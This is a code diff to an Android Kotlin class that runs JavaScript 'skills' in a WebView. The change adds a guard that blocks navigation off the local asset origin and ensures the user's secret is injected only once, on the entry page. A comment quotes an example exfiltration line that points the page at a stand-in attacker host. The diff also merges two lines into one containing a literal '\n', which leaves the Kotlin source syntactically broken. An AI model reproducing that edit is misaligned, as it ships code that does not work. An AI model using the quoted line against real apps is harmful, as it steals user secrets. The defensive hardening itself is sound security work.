@@ -174,22 +174,43 @@ class JsSkillRunner(private val context: Context) {
                     layoutParams = ViewGroup.LayoutParams(1, 1)
                 }
                 wv.addJavascriptInterface(BridgeImpl(deferred), JS_INTERFACE_NAME)
-                wv.webChromeClient = object : WebChromeClient() {
-                    override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
+                wv.webChromeClient = object : WebChromeClient() {\n                    override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
                         consoleMessage?.let {
                             Log.d(TAG, "[JS console] ${it.message()} (${it.sourceId()}:${it.lineNumber()})")
                         }
                         return true
                     }
                 }
+                // https://<skill-slug>-<hash>.appassets.androidplatform.net/skill/<relPath> —
+                // intercepted by the asset loader and served from the skill root; never touches
+                // the network. Hoisted above the client: both the navigation guard and the
+                // injection guard below compare against it.
+                val skillUrl = "https://$originHost$SKILL_PATH$relPath"
+                val injected = java.util.concurrent.atomic.AtomicBoolean(false)
                 wv.webViewClient = object : WebViewClient() {
                     override fun shouldInterceptRequest(
                         view: WebView?,
                         request: WebResourceRequest,
                     ): WebResourceResponse? = assetLoader.shouldInterceptRequest(request.url)
 
+                    override fun shouldOverrideUrlLoading(
+                        view: WebView?,
+                        request: WebResourceRequest?,
+                    ): Boolean {
+                        // Any navigation off our virtual asset origin is refused. Without this a
+                        // skill could do `location.href = "https://attacker.example/collect"`, get
+                        // a fresh `onPageFinished`, and have the user's plaintext skill secret
+                        // injected into a third-party page.
+                        val target = request?.url ?: return true
+                        return target.host != originHost
+                    }
+
                     override fun onPageFinished(view: WebView?, url: String?) {
                         super.onPageFinished(view, url)
+                        // Entry document only, exactly once: a hash change, a reload or a re-entry
+                        // otherwise re-ran the trigger (and re-injected the secret).
+                        if (url != skillUrl) return
+                        if (!injected.compareAndSet(false, true)) return
                         Log.d(TAG, "page finished, evaluating trigger script: $url")
                         // The trigger waits up to 10s for the page's
                         // `ai_edge_gallery_get_result` to be defined, then invokes it and
@@ -220,10 +241,6 @@ class JsSkillRunner(private val context: Context) {
                     }
                 }
                 webView = wv
-                // https://<skill-slug>-<hash>.appassets.androidplatform.net/skill/<relPath> —
-                // intercepted by the asset loader and served from the skill root; never touches
-                // the network.
-                val skillUrl = "https://$originHost$SKILL_PATH$relPath"
                 Log.d(TAG, "loading: $skillUrl (data=${data.take(80)}, secret=${if (secret.isNotEmpty()) "<set>" else "<empty>"})")
                 wv.loadUrl(skillUrl)
 
